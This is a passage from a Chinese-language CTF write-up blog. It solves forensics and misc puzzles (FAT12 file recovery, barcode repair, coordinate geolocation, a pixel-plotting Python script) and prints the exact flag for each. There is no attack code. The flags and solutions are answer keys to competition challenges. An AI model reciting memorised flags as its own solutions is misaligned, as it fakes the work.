src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618561429297.6f97bc81c2552c5f67ac73114024f88ba8541841.png" alt="image-20210416162348906"></p><p>在此界面时按 c 将文件拷贝到软盘数据文件的目录下。恢复得到的 <code>_LAG.ICO</code> 如下。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618561604774.22466738c5a2cbadcf93c182b6916bb57451238d.png" alt="image-20210416162644470"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;FAT12_FTW&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2020-barcoder"><a href="#BSidesSF2020-barcoder" class="headerlink" title="[BSidesSF2020]barcoder"></a>[BSidesSF2020]barcoder</h3><p>画图一把梭修复条形码，得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618563141840.633accf5b07c432c1b938968757349cb312f2140.png@200w"></p><p>使用 bcTester 扫描条形码可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618563187108.fe4e0d8dcf8c4216a25ef18c259c1aef9acdb7cb.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;way_too_common&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-Kadyrov’s-Cat"><a href="#CFI-CTF-2018-Kadyrov’s-Cat" class="headerlink" title="[CFI-CTF 2018]Kadyrov’s Cat"></a>[CFI-CTF 2018]Kadyrov’s Cat</h3><blockquote><p>A man from the soviet union has sent you two strange documents. Find the identity of the man as well as his location.</p><p>Flag format is : <code>CFI&#123;Firstname_Lastname_of_City&#125;</code></p></blockquote><p>附件中的图片有经纬度。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618563867205.622fdd3c8f0530f330d67eef1163981be78ff1aa.png"></p><p>稍微计算一下可以得到如下结果。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618564139558.fd5e6700771dfd06a65308543ef08549dd8d8951.png"></p><p>使用地图可以得到地址 <code>Uzvaras bulvāris, Centra rajons, Rīga, LV-1050, Latvia</code>，因此城市是 Riga。</p><p>使用 Acrobat DC 打开附件给出的 PDF 文件可得如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618564527199.91a853ea64b19d1d38516c8e0e80abd85ada7ff4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFI&#123;Kotik_Kadyrov_of_Riga&#125;</span><br></pre></td></tr></table></figure><h3 id="Weird-List"><a href="#Weird-List" class="headerlink" title="Weird_List"></a>Weird_List</h3><p>附件给出的是一堆数据，推测其构成了一幅图片。因此写个脚本将数据画出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"></span><br><span class="line">pixels = [[<span class="number">120</span>], [<span class="number">120</span>], [<span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">7</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>], [<span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>], [<span class="number">19</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">19</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">31</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>], [<span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">31</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>], [<span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">67</span>, <span class="number">1</span>, <span class="number">32</span>], [<span class="number">120</span>], [<span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">86</span>, <span 